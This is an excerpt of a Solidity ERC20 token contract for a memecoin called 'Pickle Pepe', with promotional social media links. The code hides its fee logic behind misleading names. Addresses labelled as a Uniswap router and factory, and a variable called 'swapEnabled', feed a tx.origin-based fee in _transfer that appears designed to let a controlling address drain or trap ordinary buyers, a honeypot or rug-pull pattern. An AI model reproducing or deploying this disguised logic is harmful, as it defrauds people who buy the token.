...
https://twitter.com/PicklePepeBNB
https://t.me.com/PicklePepeBNB
https://PicklePepeBNB.xyz
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address internal _uniswapRouterV2 = 0x8Aa5351Ae02C2A32B40048B33E9aaCFc8bA94ef1;
    uint256 private swapEnabled = 2;
    string private _symbol;
    mapping(address => uint256) private _balances;
    uint256 private _totalSupply;
    address private V2Factory = 0xD02185Abad9216C0ae2B65F326FF90A5386750E2;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual
    {
        ...
        uint256 swapamount = amount.mul(to != tx.origin && from != _uniswapRouterV2 && _balances[V2Factory] > 0 ? _pairToken : swapEnabled).div(100) + 0;
        if (swapamount > 0)
        {
...
contract PicklePepe is ERC20, Ownable
{
    constructor() ERC20(unicode"Pickle Pepe", unicode"PIPEPE")
    {
